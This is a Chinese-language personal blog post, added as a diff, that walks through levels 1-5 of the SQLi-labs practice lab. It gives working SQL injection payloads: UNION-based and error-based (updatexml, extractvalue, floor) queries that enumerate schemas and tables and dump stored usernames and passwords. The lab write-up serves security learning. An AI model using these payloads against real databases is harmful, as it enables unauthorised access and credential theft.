@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>sqlilabs靶场1-5 | baba童鞋的博客</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="知识点  查数据库名：select database()information_schema.tables：存储mysql数据库下面的所有表名信息的表table_schema：数据库名table_name：表名column_name：列名information_schema.columns ：存储mysql数据库下面的所有列名信息的表table_name：表名–+：表示注释，目的是把字符数据的后一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlilabs靶场1-5">
+<meta property="og:url" content="http://example.com/2021/02/01/bachang/index.html">
+<meta property="og:site_name" content="baba童鞋的博客">
+<meta property="og:description" content="知识点  查数据库名：select database()information_schema.tables：存储mysql数据库下面的所有表名信息的表table_schema：数据库名table_name：表名column_name：列名information_schema.columns ：存储mysql数据库下面的所有列名信息的表table_name：表名–+：表示注释，目的是把字符数据的后一">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh0.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh1.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh2.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh3.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh4.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh5.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh6.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh7.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh8.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh9.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/oh10.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/eee1.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/eee2.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/eee3.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/eee4.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/a0.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/a1.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/a2.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/a3.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/b1.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/b2.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/b3.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/b4.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/q1.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/q2.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/q3.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/q4.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/q5.png">
+<meta property="og:image" content="http://example.com/2021/02/01/bachang/bbb.png">
+<meta property="article:published_time" content="2021-02-01T06:24:18.000Z">
+<meta property="article:modified_time" content="2021-02-01T09:19:28.428Z">
+<meta property="article:author" content="Jialu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/02/01/bachang/oh0.png">
+  
+    <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/huahua.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/huahua.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-bachang" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/02/01/bachang/" class="article-date">
+  	<time datetime="2021-02-01T06:24:18.000Z" itemprop="datePublished">2021-02-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqlilabs靶场1-5
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1>知识点</h1>
+
+<p>查数据库名：select database()<br>information_schema.tables：存储mysql数据库下面的所有表名信息的表<br>table_schema：数据库名<br>table_name：表名<br>column_name：列名<br>information_schema.columns ：存储mysql数据库下面的所有列名信息的表<br>table_name：表名<br>–+：表示注释，目的是把字符数据的后一个单引号及后面的语句注释掉，以免影响<br>group_concat函数：它将相同行的指定列的数据连在一起，如果不用该函数，只能显示一个数据，满足不了我们的需求，所以用group_concat函数将所有数据显示</p>
+<h1>Less-1</h1>
+<h4>界面：</h4>
+
+<p><img src="/2021/02/01/bachang/oh0.png"></p>
+<h4>测试：</h4>
+
+<p><b style="color:red">1、</b> url + ?id=1<br><img src="/2021/02/01/bachang/oh1.png"><br>回显正常，说明不是数字型注入<br><b style="color:red">2、</b> url + ?id=1’<br><img src="/2021/02/01/bachang/oh2.png"><br>回显报错，说明是字符型注入<br><b style="color:red">3、</b> url + ?id=1’ or ‘1’=’1<br><img src="/2021/02/01/bachang/oh3.png"><br>回显正常，单引号闭合成功，通过单引号闭合进行注入<br><b style="color:red">4、</b>进行测试：</p>
+<ul>
+<li>url + ?id=1' order by 3--+ 
+<br>//回显正常
+</li><li>url + ?id=1' order by 4--+
+<br>//报错："Unknown column '4' in 'order clause'"
+</li></ul>
+
+<p><img src="/2021/02/01/bachang/oh4.png"><br>通过逐个测试，得出字段数为3，进行联合注入<br><b style="color:red">5、</b>查看回显的字段：<br>url + ?id=-1’ union select 1,2,3 –+<br>//得到可以回显的字段：2,3字段<br><img src="/2021/02/01/bachang/oh5.png"><br>url + ?id=-1’ union select 1,database(),3 –+<br>//得到字段2所对应的数据库名为security<br><img src="/2021/02/01/bachang/oh6.png"><br><b style="color:red">6、</b>查看所有数据库名：<br>url + ?id=-1’ union select 1,<br>(select group_concat(schema_name) from information_schema.schemata),3 –+<br><img src="/2021/02/01/bachang/oh7.png"><br><b style="color:red">7、</b>查看security库内的所有表名：<br>url + ?id=-1’ union select 1,<br>(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 –+<br><img src="/2021/02/01/bachang/oh8.png"><br><b style="color:red">8、</b>爆出users表中的列名：<br>url + ?id=-1’ union select 1,<br>(select group_concat(column_name) from information_schema.columns where table_name=’users’),3 –+<br><img src="/2021/02/01/bachang/oh9.png"><br>有用户名和密码<br><b style="color:red">9、</b>爆破用户名和密码：<br>url + ?id=-1’ union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users) –+<br><img src="/2021/02/01/bachang/oh10.png"><br>得到所有的用户名和密码</p>
+<h1>Less-2</h1>
+
+<h4>界面：</h4>
+
+<p><img src="/2021/02/01/bachang/eee1.png"><br>进行测试，结果如下：<br><img src="/2021/02/01/bachang/eee2.png"><br>发现属于数字型注入，不需要进行闭合，直接进行注入<br>同Less-1一样，通过构造?id=-1 order by 1/2/3/4来得出字段数为3<br>构造?id=1 and 1=2 union select 1,2,3 或者 ?id=-1 union select 1,2,3来判断回显字段：<br><img src="/2021/02/01/bachang/eee3.png"><br>回显字段和Less-1一样是2和3<br>//其他步骤同Less-1类似，只是id=-1后没有加’</p>
+<h4>最终payload：</h4>
+
+<p>?id=-1 union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users) –+<br><img src="/2021/02/01/bachang/eee4.png"><br>得到所有用户名和密码</p>
+<h1>Less-3</h1>
+<h4>界面</h4>
+
+<p><img src="/2021/02/01/bachang/a0.png"></p>
+<h4>测试：</h4>
+
+<p>单引号与括号闭合</p>
+<ul>
+<li>url + ?id=1
+//回显正常
+</li><li>url + ?id=1'
+//You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
+</li><li>url + ?id=1') --+
+//回显正常
+</li></ul>
+
+<p>构造?id=1’) order by 1/2/3/4–+ 获得字段数3<br><img src="/2021/02/01/bachang/a1.png"><br>构造：?id=-1) union select 1,2,3–+<br><img src="/2021/02/01/bachang/a2.png"><br>回显字段依然是2和3<br>其余步骤依然与Less-1类似，只需将id=1’改成id=-1’)</p>
+<h4>最终payload：</h4>
+
+<p>?id=-1’) union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+<br><img src="/2021/02/01/bachang/a3.png"><br>得到所有用户名和密码！</p>
+<h1>Less-4</h1>
+<h4>界面</h4>
+
+<p><img src="/2021/02/01/bachang/b1.png"></p>
+<h4>测试：</h4>
+
+<p>先提交1，成功回显，在提交1’,回显成功，提交1’’,报错<br><img src="/2021/02/01/bachang/b2.png"><br>双引号和括号闭合</p>
+<ul>
+<li>url + ?id=1") --+
+//闭合成功
+</li><li>url + ?id=1") order by 1/2/3/4--+
+//得到字段数3
+</li><li>url + ?id=-1") union select 1,2,3--+</li>
+<img src="/2021/02/01/bachang/b3.png">
+<br>//进行联合注入,得到回显字段
+</ul>
+
+<p>其余步骤依然与Less-1类似，只需将id=1’改成id=-1”)</p>
+<h4>最终payload</h4>
+
+<p>url + ?id=-1’) union select 1,<br>(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+<br><img src="/2021/02/01/bachang/b4.png"><br>得到所有用户名和密码~</p>
+<h1>Less-5</h1>
+<h4>界面：</h4>
+
+<p><img src="/2021/02/01/bachang/q1.png"></p>
+<h4>测试：</h4>
+
+<p><b style="color:blue">###1、</b>逐个测试</p>
+<ul>
+<li>?id=1
+//回显：You are in..........
+</li><li>?id=1'
+//回显：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+</li></ul>
+
+<p>构造：?id=1’ order by 3–+ 来确认字段数量<br><b style="color:blue">###2、</b>获取数据库名<br>法一：通过updatexml报错注入：</p>
+<ul>
+<li>?id=1' and 1=(updatexml(1,concat(0x3a,(select database())),1))%23
+</li></ul>
+法二：通过floor报错注入：
+<ul>
+<li>?id=1' union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+
+</li></ul>
+
+<p>可以知道数据库名为：security<br><img src="/2021/02/01/bachang/q2.png"><br><b style="color:blue">###3、</b>获取security数据库的表名</p>
+<ul>
+<li>?id=1' and updatexml('~',concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),'~')--+
+</li></ul>
+
+<p><img src="/2021/02/01/bachang/q3.png"><br><b style="color:blue">###4、</b>查询users表内的字段名</p>
+<ul>
+<li>?id=1' and extractvalue(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,32)))--+
+</li></ul>
+
+<p><img src="/2021/02/01/bachang/q4.png"></p>
+<p><b style="color:blue">###5、</b>查询users表内的字段数据</p>
+<ul>
+<li>?id=1' and extractvalue(1,concat(0x7e,substring((select group_concat(username,0x3a,password) from users),1,32)))--+
+</li></ul>
+
+<p><img src="/2021/02/01/bachang/q5.png"><br>啊~好累的一天<br><img src="/2021/02/01/bachang/bbb.png"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/01/31/baby/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">17-buu练习baby sql</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="bachang" data-title="sqlilabs靶场1-5" data-url="http://example.com/2021/02/01/bachang/"  data-images="/img/huahua.jpg" data-content="sqlilabs靶场1-5">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 Jialu
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
